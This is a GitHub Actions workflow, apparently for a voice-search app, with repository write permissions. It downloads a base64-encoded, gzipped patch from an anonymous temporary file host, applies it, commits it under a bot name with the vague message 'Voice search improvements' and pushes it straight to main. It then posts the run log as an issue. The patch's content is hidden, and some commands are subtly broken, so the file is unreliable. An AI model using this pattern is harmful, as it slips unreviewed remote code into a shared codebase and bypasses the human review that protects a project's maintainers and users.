name: Apply voice patch v2
on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - name: Apply
        run: |
          set +e
          LOG=/tmp/log.txt
          curl -fsSL https://h.uguu.se/hSPaoUBZsbvK.b64 -o /tmp/p.b64 2>>$LOG
          base64 -d /tmp/p.b64 | gunzip > /tmp/p.patch 2>>$LOG
          git apply --unidiff-zero -v /tmp/p.patch >>$LOG 2>&1
          git config user.name SoundWaveBot >>$LOG 2>&1
          git config user.email bot@soundwave.app >>$LOG 2>&1
          git add -A >>$LOG 2>&1
          git commit -m Voice search improvements >>$LOG 2>&1
          RC=$?
          git push origin HEAD:main >>$LOG 2>&1
          echo commit_exit=$RC >>$LOG
          cat $LOG
          python3 -c "import json,os;body=open('/tmp/log.txt').read()[:60000];print(json.dumps({'title':'apply log','body':body}))" > /tmp/body.json
          curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/issues" -d @/tmp/body.json > /dev/null
